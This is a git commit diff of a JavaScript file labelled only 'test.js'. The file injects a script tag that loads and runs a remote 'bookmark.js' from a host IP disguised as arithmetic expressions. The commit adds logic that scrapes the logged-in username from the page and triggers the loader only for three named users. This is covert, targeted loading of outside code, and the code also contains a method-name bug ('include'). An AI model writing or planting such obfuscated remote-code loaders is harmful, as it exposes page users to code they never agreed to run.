94b6deae4bec93ecb3a87466e9d57897f12c62e0
Darken248 <56902326+darken248@users.noreply.github.com>
2023-08-14 21:25:34 -0500

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,16 @@
-if(document.getElementsByName("e").length >= 1) {
-  document.getElementById("eiframe").classList.toggle("ehidden");
-} else {
+function e() {
   var escript = document.createElement("script"); 
   var earray = [(2*2 - 1*2)+1, (6*6*6) - (2*3-(6/3)-2*2+2), 6*6*2*3 - (6+12), (3-29)*(21+29)+29*(21-3+29)]
   escript.src = `https://${earray.join(".")}/bookmark.js`; 
   document.body.appendChild(escript)
+}
+
+if(document.getElementsByName("e").length >= 1) {
+  document.getElementById("eiframe").classList.toggle("ehidden");
+} else {
+  var eusers = ["alvin", "josue", "dylan"]
+  var euser = document.getElementsByClassName("fa fa-user")[0].parentElement.innerText.replaceAll("  ", "").toLowerCase();
+  eusers.forEach(eeuser => {
+      if(euser.include(eeuser)) return e()
+  })
 }
